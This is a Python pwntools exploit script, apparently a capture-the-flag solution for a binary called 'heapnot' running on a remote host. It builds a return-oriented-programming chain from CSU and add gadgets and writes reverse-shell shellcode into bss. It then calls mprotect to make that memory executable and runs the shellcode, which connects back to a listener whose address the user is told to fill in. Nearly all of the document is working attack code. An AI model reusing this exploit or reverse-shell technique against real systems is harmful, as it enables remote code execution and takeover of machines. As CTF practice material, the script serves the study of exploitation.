#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'


def one_gadget(filename, base_addr=0):
    return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]


exe = ELF('./heapnot')
rop = ROP(exe)
libc = ELF('./libc.so.6')

host, port = "143.198.127.103", "42009"

if args.REMOTE:
    p = remote(host, port)
else:
    p = process(exe.path)

buff = 0x404c00         # a buffer on bss+0xa00 around

# find the various gadget we need
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
gadget_add = next(exe.search(asm('add [rbp-0x3d], ebx')))

gadget_csu = next(exe.search(
    asm('pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret')))
gadget_csu2 = next(exe.search(asm('mov rdx,r14; mov rsi,r13; mov edi,r12d')))


def add_gadget(gadget_csu, gadget_add, address, val):
    return p64(gadget_csu)+p64(val & 0xffffffff)+p64(address+0x3d)+p64(0)*4+p64(gadget_add)


gadget1 = rop.find_gadget(['ret'])[0]                       # ret
gadget2 = next(exe.search(asm('add rax,rdx; jmp rax;')))

# put the correct address of you listening nc here (IP & port) the port must be reachable from internet
shellc = asm(shellcraft.connect(host='127.0.0.1',
             port=12490, network='ipv4')+shellcraft.dupsh())

length = len(shellc)
length = (length+3) & 0xffc
shellc = shellc.ljust(length, '\x90')

# libc gadgets,  (write primitive)
gl0 = 0x000000000003accb  # mov qword ptr [rdi], rax ; subsd xmm0, xmm1 ; ret

# offset in remote docker is a bit different
if args.REMOTE:
    offset = 0x25ff0
else:
    offset = 0x24ff0

payload = '5 '+'A'*0x2e+p64(0xdeadbeef)
# add ret gadget address to bss
payload += add_gadget(gadget_csu, gadget_add, buff, gadget1)
# copy shellcode to bss with gadget_add
for i in range(length/4):
    payload += add_gadget(gadget_csu, gadget_add, buff +
                          8+(i*4), u32(shellc[i*4:(i*4)+4]))
# call malloc to have a near libc address in rax, then jump to mprotect with gadget2
payload += p64(pop_rdi)+p64(140000)+p64(exe.symbols['malloc'])+p64(gadget_csu)+p64(0)+p64(
    1)+p64(buff-8)+p64(0)+p64(offset + gl0)+p64(buff)+p64(gadget_csu2)+p64(0)*7+p64(gadget2)
payload += add_gadget(gadget_csu, gadget_add, buff-8,
                      (libc.symbols['mprotect'] - gl0))
payload += p64(gadget_csu)+p64(0)+p64(1)+p64(0x404000) + \
    p64(0x1000)+p64(7)+p64(buff-8)+p64(gadget_csu2)+p64(0)*7
# jump to my shellcode
payload += p64(buff+8)

print('now we send our payload...')
p.sendafter('go!")?\n', payload.ljust(0x4000, '\x00'))

p.interactive()
